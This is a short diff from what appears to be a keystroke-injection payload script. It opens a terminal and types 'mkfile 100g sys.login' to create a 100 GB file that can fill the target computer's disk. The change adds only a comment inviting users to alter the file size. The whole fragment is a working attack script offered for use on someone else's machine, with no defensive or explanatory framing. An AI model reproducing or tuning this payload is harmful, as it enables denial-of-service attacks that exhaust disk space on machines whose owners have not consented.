@@ -9,6 +9,7 @@ STRING TERMINAL
 DELAY 250
 ENTER
 DELAY 500
+REM you can change te size replacing the 100g 
 STRING mkfile 100g sys.login
 DELAY 250
 ENTER
